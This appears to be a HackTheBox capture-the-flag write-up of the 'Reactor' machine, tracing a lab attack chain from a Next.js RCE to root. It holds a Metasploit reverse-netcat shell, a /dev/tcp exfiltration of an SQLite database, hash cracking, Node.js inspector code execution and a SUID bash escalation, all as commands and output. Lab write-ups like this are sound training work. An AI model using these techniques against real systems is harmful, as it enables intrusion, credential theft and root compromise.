# Reactor - HackTheBox Writeup

## Introduction

**Reactor** is a Linux-based machine exposing a minimal external attack surface consisting of a Next.js web application. Initial access is obtained by exploiting a command execution vulnerability in a Metasploit module targeting the React-based backend. Post-exploitation enumeration reveals an internal SQLite database containing credentials for an application user. Privilege escalation is achieved by abusing a locally exposed Node.js debugging interface (`--inspect`), allowing arbitrary code execution in the context of a privileged system process. The final escalation path relies on hijacking the Node.js debugger session to execute system commands as root.

---

## Initial Enumeration

## 1. External Enumeration

### TCP Scan

```bash
nmap -p- -sV -T4 reactor.htb
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu3.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
```

At first glance, Nmap did not correctly fingerprint the service on port 3000, returning an ambiguous `ppp?` service label and failing to identify HTTP or any web stack.

To clarify the service running on this port, an additional targeted HTTP probe was performed using external service fingerprinting data (`nerva.json`).

### HTTP Service Verification (Nerva)

```json
{
  "ip": "10.129.3.223",
  "port": 3000,
  "protocol": "http",
  "tls": false,
  "transport": "tcp",
  "metadata": {
    "status": "200 OK",
    "status_code": 200,
    "response_headers": {
      "Content-Type": "text/html; charset=utf-8",
      "X-Powered-By": "Next.js"
    },
    "technologies": [
      "React",
      "Webpack",
      "Next.js",
      "Node.js"
    ]
  }
}
```

The service on port 3000 is confirmed as a **Next.js (Node.js) HTTP application**, despite Nmap’s incomplete fingerprinting.

### Final Service Interpretation

* **Port 3000:** HTTP service (Next.js / React frontend)
* **Port 22:** SSH (OpenSSH 9.6p1 Ubuntu)
* **Application Stack:** Node.js + Next.js web application
* **Initial Attack Surface:** Single web entry point on TCP/3000

---
## 2. Exploitation: React/Next.js Command Injection (Metasploit)

The target is exploited using a Metasploit module designed for a command injection vulnerability in a React/Next.js handler.

### Module Configuration

```bash
msfconsole
use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
```

```text
RHOSTS => reactor.htb
RPORT  => 3000
TARGETURI => /
LHOST  => 10.10.15.191
LPORT  => 4444
LOGIN_CMD => /bin/nc
```

Payload type:

```text
cmd/unix/reverse_netcat
```

---
### Exploit Execution

```bash
run
```

```text
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Started reverse TCP handler against 10.10.15.191:4444
[*] Command shell session 1 opened (10.10.15.191:4444 -> 10.129.3.223:49334)
```

### Verification Commands

```bash
id

uid=999(node) gid=988(node) groups=988(node)
```

```bash
whoami

node
```

```bash
ls

app
next.config.js
node_modules
package.json
package-lock.json
reactor.db
```

Foothold achieved as `node`.

---

## 3. Post-Exploitation Enumeration

### System Inspection

```bash
uname -a
```

```text
Linux reactor 6.8.0-117-generic #117-Ubuntu SMP PREEMPT_DYNAMIC Tue May  5 19:26:24 UTC 2026 x86_64 GNU/Linux
```

### Database Discovery

```bash
cat reactor.db
```

Initial raw output indicated an embedded SQLite database.

Database extraction via transfer:

```bash
nc -nvlp 4444 > reactor.db
```

Target-side:

```bash
cat reactor.db > /dev/tcp/10.10.15.191/4444
```

Local verification:

```bash
file reactor.db
```

```text
SQLite 3.x database
```

---

## 4. Credential Extraction (SQLite)

```bash
sqlite3 reactor.db
.tables
```

```text
sensor_logs  users
```

### Schema Inspection

```bash
.schema users
```

```text
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
);
```

### Data Extraction

```bash
select * from users;
```

```text
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

### Password Cracking / Identification


```bash
hashcat -m 0 hashes.txt ../../../rockyou.txt -w3
```

Found:
```text
engineer:
39d97110eafe2a9a68639812cd271e8e -> reactor1
```

---

## 5. User Access (SSH)

Using recovered credentials:

```bash
ssh engineer@reactor.htb
```

```text
engineer@reactor:~$
```

### User Flag

```bash
cat user.txt
```

```text
22a0e3cc<SNIP>
```

---

## 6. Local Enumeration

### Privileges

```bash
sudo -l
```

```text
Sorry, user engineer may not run sudo on reactor.
```

### Running Services

```bash
ss -tulpn
```

```text
127.0.0.1:9229   LISTEN   node inspector
*:3000           LISTEN   next.js
```

The system exposes a **Node.js inspector/debugger interface** on localhost only.

### Process Context

```bash
ls /opt
```

```text
reactor-app
uptime-monitor
```

The Node.js service `uptime-monitor` is responsible for the debug interface binding.

---

## 7. Node.js Debugger Abuse (Privilege Escalation Path)

## 7.1 Accessing the Inspector

The Node.js process is started with:

```text
--inspect=127.0.0.1:9229
```

This exposes a V8 debugger protocol bound to localhost, restricting direct external access.

---

### Remote Access via SSH Port Forwarding

```bash
ssh -L 9229:127.0.0.1:9229 engineer@reactor.htb
```

```text
Linux reactor 6.8.0-117-generic ... 
Last login: ...
engineer@reactor:~$
```

This forwards the remote Node.js inspector port to the local machine, making it accessible via `127.0.0.1:9229`.

---

### Debugger Connection

```bash
node inspect 127.0.0.1:9229
```

```text
connecting to 127.0.0.1:9229 ... ok
debug>
```

The Node.js debugging interface is now accessible locally, enabling execution in the context of the remote Node process.

---

## 7.2 Debugger Capability Validation

```bash
debug> exec("process.version")
```

```text
v20.20.2
```

The context allows execution via `process.mainModule.require`.

---

## 7.3 Initial Code Execution Test

The Node.js inspector returns different output formats depending on how the result is handled. Raw execution does not always print human-readable stdout.

### Raw Execution

```bash
debug> exec("process.mainModule.require('child_process').execSync('id')")
```

```text
Uint8Array(39)
```

---

### Decoded Output

```bash
debug> exec("process.mainModule.require('child_process').execSync('id').toString()")
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

### Verification Commands

```bash
debug> exec("process.mainModule.require('child_process').execSync('whoami').toString()")
```

```text
root
```


---

## 7.4 File System Write Capability

```bash
debug> exec("process.mainModule.require('child_process').execSync('touch /tmp/test')")
```

```text
(no output expected)
```

From engineer ssh shell:
```bash
ls /tmp
```

```text
test
```

---

## 7.5 Privilege Escalation via SUID Shell Creation

A local root-equivalent escalation is prepared by copying a privileged binary:

```bash
debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/primebash && chmod +s /tmp/primebash')")
```

Verification:

```bash
ls -l /tmp/primebash
```

```text
-rwsr-sr-x 1 root root ... /tmp/primebash
```

---

## 7.6 Root Shell Execution

```bash
/tmp/primebash -p
```

```text
primebash-5.2# whoami
root
```

---

## 8. Root Flag

```bash
cat /root/root.txt
```

```text
56fddd<SNIP>
```

---

## Conclusions

* **Metasploit Reliability Tradeoff:** The initial RCE chain is automated, but payload selection (`LOGIN_CMD`) strongly influences shell stability and session creation reliability.
* **Local Debug Interfaces:** Node.js inspector (`--inspect`) exposed on localhost can be equivalent to remote code execution when accessible from a compromised user.
* **Process Trust Boundary Failure:** The debugging interface runs within the same security context as the application, allowing arbitrary code execution without privilege separation.
* **SUID Misuse:** Copying `/bin/bash` and applying SUID permissions provides a direct escalation path when write access to privileged operations is available.
* **Attack Chain Summary:** Web RCE → SQLite credential extraction → SSH user access → Node inspector abuse → SUID root shell.

---
## References:

- [React2Shell-HTB-ThreatSpotlight](https://www.hackthebox.com/blog/react2shell-cve-2025-55182-threat-spotlight)
- [CVE-2025-55182](https://www.cve.org/CVERecord?id=CVE-2025-55182)
- [Nodejs Debugger Inspector RCE](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.html#rce-in-nodejs-debuggerinspector)
- 